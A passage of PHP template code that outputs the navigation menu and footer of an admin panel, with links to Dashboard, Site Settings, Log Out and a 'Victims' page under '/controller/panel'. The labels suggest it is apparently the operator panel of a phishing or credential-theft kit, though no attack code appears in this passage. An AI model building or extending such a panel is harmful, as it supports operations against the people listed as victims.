                      <span>Dashboard</span>
                    </a>
                  </li>
                  <li class="dropdown-item py-2">
                    <a href="/controller/panel/victims" class="text-body ms-0">
                      <i class="me-2 icon-md" data-feather="users"></i>
                      <span>Victims</span>
                    </a>
                  </li>
                  <li class="dropdown-item py-2">
                    <a href="/controller/panel/settings" class="text-body ms-0">
                      <i class="me-2 icon-md" data-feather="settings"></i>
                      <span>Site Settings</span>
                    </a>
                  </li>
                  <li class="dropdown-item py-2">
                    <a href="/controller/panel/../logout" class="text-body ms-0">
                      <i class="me-2 icon-md" data-feather="log-out"></i>
                      <span>Log Out</span>
                    </a>
                  </li>
                </ul>
							</div>
						</li>
					</ul>
				</div>
			</nav>
        ';
    }else if($type == 'panel/footer'){
        echo
        '
        <footer class="footer d-flex flex-column flex-md-row align-items-center justify-content-between px-4 py-3 border-top small">
            <p class="text-muted mb-1 mb-md-0">Copyright © '.date('Y').' '.site('name').'</p>
        </footer>
        ';
    }
}


